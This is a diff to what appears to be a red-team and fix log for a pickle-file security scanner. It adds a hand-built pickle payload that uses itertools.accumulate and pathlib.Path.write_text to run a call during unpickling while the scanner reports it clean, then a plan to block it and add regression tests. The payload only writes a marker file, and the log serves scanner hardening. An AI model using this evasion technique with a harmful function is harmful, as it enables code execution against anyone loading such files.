@@ -1105,3 +1105,97 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 29 - `itertools.accumulate` binary-function call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_itertools_accumulate_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("itertools"),
+        s("accumulate"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_itertools_accumulate_tuple_marker"),
+        b"tRa",
+        s("x"),
+        b"a",
+        s("pathlib"),
+        s("Path.write_text"),
+        b"\x93",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_itertools_accumulate_tuple_marker` with
+  content `x` and returns
+  `(PosixPath("/tmp/ma_itertools_accumulate_tuple_marker"), 1)`
+- RCE mechanism: the pickle constructs
+  `itertools.accumulate([marker, "x"], pathlib.Path.write_text)`, then
+  immediately calls `tuple(...)` on that accumulate object. `accumulate()`
+  stores an attacker-selected binary function and iterable inputs, while
+  `tuple()` forces iteration during unpickling, invoking the function with
+  attacker-controlled arguments. `Path.write_text()` writes the marker file and
+  returns the number of characters written.
+
+Why the scanner missed it:
+
+- `itertools.accumulate` is absent from `DANGEROUS_GLOBALS`; only
+  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.groupby`,
+  `itertools.starmap`, and `itertools.takewhile` are currently listed.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `itertools.accumulate`, `pathlib.Path.write_text`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a lazy arbitrary binary-call sink that can be forced
+by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
+entry for `("itertools", "accumulate")`, plus a manual-pickle oracle
+regression that proves scan-time detection before unpickle-time marker
+creation.
+
+## Turn 30 - Block `itertools.accumulate`
+
+Blocking plan:
+
+- Add `("itertools", "accumulate")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. `tuple` stays allowed because the arbitrary-call sink is
+  `accumulate`; `tuple` only forces iteration.
+- Add portable policy coverage for raw `GLOBAL itertools accumulate`
+  reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(itertools.accumulate([marker, "x"], pathlib.Path.write_text))`,
+  verifies scanner detection, then verifies the marker file appears only
+  during unpickle.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add iterable-flow analysis or broader string
+scanning.
